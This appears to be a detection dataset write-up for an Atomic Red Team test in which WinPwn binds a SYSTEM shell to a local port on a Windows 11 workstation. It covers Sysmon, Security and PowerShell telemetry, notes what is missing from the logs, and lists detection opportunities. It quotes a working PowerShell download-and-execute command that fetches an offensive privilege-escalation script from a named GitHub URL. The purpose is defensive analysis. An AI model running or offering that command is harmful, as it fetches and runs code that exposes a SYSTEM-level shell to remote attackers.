# T1106-3: Native API — WinPwn - Get SYSTEM shell - Bind System Shell using CreateProcess technique

## Technique Context

T1106 (Native API) covers programmatic use of Windows APIs as an execution and escalation primitive. This test uses WinPwn's `Get-CreateProcessSystemBind` technique: it downloads a PowerShell script from GitHub at runtime and uses the `CreateProcess` API to bind a SYSTEM-level shell to a local port, making the elevated shell accessible over the network.

The "bind" variant differs from the "pop" variant (T1106-2) in its operational purpose: rather than launching an interactive SYSTEM shell on the current session, it creates a listener that allows an attacker to connect to the SYSTEM shell remotely. This is a privilege escalation combined with a lateral movement/persistence mechanism—once the port is bound, any process that connects to it receives a SYSTEM-level shell.

The script downloaded at runtime is: `https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1`.

## What This Dataset Contains

This dataset was collected on ACME-WS06, a Windows 11 Enterprise domain workstation with Microsoft Defender disabled. The technique executed fully.

**Process Chain (Security EID 4688 / Sysmon EID 1):**

The ART test framework PowerShell (PID 7152) spawns a child PowerShell (PID 5328, tagged `technique_id=T1059.001`) with:

```
"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')}
```

This is the same `iex(new-object net.webclient).downloadstring(...)` in-memory download-and-execute pattern as T1106-2, differing only in the script URL (Bind vs. Get-CreateProcessSystem).

**Process Access (Sysmon EID 10):**

Four events: PID 7152 (test framework) accesses `whoami.exe` (PID 4680) and the child PowerShell (PID 5328). The `UNKNOWN` CallTrace on the child PowerShell access is consistent with the IEX execution path seen in T1106-2.

**Image Loads (Sysmon EID 7):**

Twenty-five DLL load events for the test framework PowerShell (PID 7152)—same count as T1106-2, reflecting the identical test framework PowerShell initialization.

**File Creation (Sysmon EID 11):**

Three file creation events, all PowerShell profile writes:
- `C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive` (PID 2044, at 23:46:49.462)
- `StartupProfileData-Interactive` (PID 7152, test framework, at 23:46:49.806)

No compilation-related file creation is visible—if the Bind script also compiles C# code at runtime (as the Get variant does), the compiled binary write was not captured in the sample.

**Named Pipe (Sysmon EID 17):**

Three pipe creation events:
- `\PSHost.134180056032282718.7152.DefaultAppDomain.powershell` (test framework PID 7152)
- `\PSHost.134180056091647911.2044.DefaultAppDomain.powershell` (PID 2044)

**PowerShell Script Block Logging (EID 4104/4103):**

110 events: 108 EID 4104, 2 EID 4103. Similar to T1106-2's count, reflecting the same WinPwn module execution depth.

## What This Dataset Does Not Contain

No Sysmon EID 3 (network connection) events are captured. The bind shell technique, if successful, would create a listening socket—but there is no EID 3 or EID 22 showing the port-binding activity or the script download from GitHub.

Unlike T1106-2, there are no `csc.exe` or `cvtres.exe` process creation events in the Security channel for this dataset. This could mean: (1) the Bind variant of the WinPwn script takes a different execution path that doesn't require compilation, (2) the compilation occurred but was not captured in the Security 4688 sample window, or (3) the compilation happened within the child PowerShell process using a different .NET compilation method.

The bound port and any incoming connections are not visible. The listener PID and its socket state are not captured. If the bind shell connected successfully, there would be network events not present in this dataset.

## Assessment

This dataset presents a narrower evidence base than T1106-2. The critical indicator—the `iex(new-object net.webclient).downloadstring(...)` command line with the WinPwn Bind URL—appears in Sysmon EID 1, and that is the primary observable of value. The absence of csc.exe spawning (unlike T1106-2) and the absence of network events limits the depth of behavioral evidence compared to the Get variant.

Compared to the defended variant (sysmon 30, security 10, powershell 28), the undefended dataset has more Sysmon events (39) and many more PowerShell events (110 vs. 28). The PowerShell event count disparity suggests the bind technique runs longer or generates more script activity when uninterrupted—the defended variant's lower count likely reflects early termination by Defender.

The structural similarity between T1106-2 and T1106-3 is intentional and informative: both use the same WinPwn download-and-IEX pattern, differing only in which specific privilege escalation script is downloaded. A behavioral detection that catches one will catch both.

## Detection Opportunities Present in This Data

**IEX + DownloadString with WinPwn GitHub URL (EID 1):** The URL `https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1` is a specific known-bad indicator. The domain `S3cur3Th1sSh1t` is a widely-known offensive tooling repository; any download from this account warrants immediate investigation.

**PowerShell spawning PowerShell with IEX + DownloadString (EID 1 / EID 4688):** `powershell.exe` spawning a child `powershell.exe` with `& { iex(new-object net.webclient).downloadstring(...) }` is a characteristic pattern regardless of the URL. The combination of parent-powershell spawning child-powershell with an explicit download-and-execute command covers both T1106-2 and T1106-3.

**Sysmon rule tag T1059.001:** The child PowerShell is tagged as PowerShell abuse by the built-in Sysmon ruleset.

**Network listening on unexpected ports (if EID 3 were captured):** In an environment with network socket monitoring, a new listening port opened by a PowerShell child process would be a definitive indicator of the bind shell variant.
